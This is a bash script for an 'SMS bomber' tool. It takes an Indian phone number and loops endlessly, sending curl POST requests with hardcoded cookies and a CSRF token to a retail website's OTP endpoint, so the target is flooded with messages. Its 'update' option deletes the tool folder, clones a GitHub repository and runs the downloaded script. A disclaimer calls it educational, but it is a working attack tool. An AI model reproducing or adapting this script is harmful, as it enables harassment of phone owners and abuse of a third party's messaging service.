#!/bin/bash
#Coded by Anubhav Kashyap
#Dont try to Steal it
pkg install figlet
apt-get install figlet

banner() {

echo -e "\e[1;34m‎‎‏‏‎ ‎"
#After \e[1;34m a blank character is used to give purple colour to banner
figlet -c XLR8 BOMB3R
echo -e "                                         \e[91mAuthor:Anubhav Kashyap"
echo -e "                                         \e[36mGroup:Deepweb Shadows"
echo ""

}


menu(){
clear
banner
printf "\e[1;92m[\e[0m xlr8\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m\n"
read -p '---------------> ' num
printf "\n"
printf ">##>\e[1;92m Starting Attack On +91$num \e[0m<##<"
sleep 5
printf "\n"
printf "Press ctrl+c to quit ! \n"
sleep 3
opr
}

opr(){

while true
do
curl -i -s -k -X $'POST' \
    -H $'Host: www.fbbonline.in' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://www.fbbonline.in/customer/account/create' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 436' -H $'DNT: 1' -H $'Connection: close' -H $'Cookie: _gcl_au=1.1.243953279.1596480303; __stp={\"visit\":\"returning\",\"uuid\":\"de2960e2-2dcc-4dfc-8afb-edce8db26f38\"}; _fv=cmpnpp; __stdf=0; __stgeo=\"1\"; __stbpnenable=1; historyPlpPage=0; PHPSESSID=u1c4phs0iqtfsl6b8nhh8n9r97; _st_time=1598178565; registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2F; all_store_details=null' \
    -b $'_gcl_au=1.1.243953279.1596480303; __stp={\"visit\":\"returning\",\"uuid\":\"de2960e2-2dcc-4dfc-8afb-edce8db26f38\"}; _fv=cmpnpp; __stdf=0; __stgeo=\"1\"; __stbpnenable=1; historyPlpPage=0; PHPSESSID=u1c4phs0iqtfsl6b8nhh8n9r97; _st_time=1598178565; registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2F; all_store_details=null' \
    --data-binary $'YII_CSRF_TOKEN=bbbef391f437ca8b30e4f2e45e998ccc9ea911e5&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D='$num'&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=sjbsj%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=malicious&RegistrationForm%5Blast_name%5D=virus&RegistrationForm%5Bpassword%5D=httpsindianvirus&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=' \
    $'https://www.fbbonline.in/customer/account/GenerateOtp' > $log.txt
done

}


menux() {

clear
apt install curl
clear
banner
date
echo "------------------------------"
printf "\e[1;33mThis tool is only for Educational Purposes !!\e[0m"
echo ""
echo "------------------------------"
echo -e "\e[34mThis Bomber Only Works In India :)"
echo "------------------------------"
echo ""
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;93m ATTACK ON NUMBER \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;93m UPDATE \e[0m\n"
printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;93m QUIT \e[0m\n"
printf "\n"
read -p 'Select Option !! >>> ' options

if [ "$options" -eq "1" ];then
        menu
fi
if [ "$options" -eq "2" ];then
clear
apt install git -y
clear
figlet -c Updating Script !
echo ""
echo ""
echo -e "\e[1;34m Requesting Update From Source..."
echo -e "\e[1;34m Request Attempt Successful.."
echo -e "\e[1;34m Updating Now..."
sleep 4
cd ..
rm -rf XLR8_BOMB3R
git clone https://github.com/anubhavanonymous/XLR8_BOMB3R
cd XLR8_BOMB3R
chmod +x xlr8.sh
figlet -c Script Updated !
sleep 2
bash xlr8.sh


fi

if [ "$options" -eq "3" ];then
        exit
        exit
        exit
else
        menux
fi


}

menux
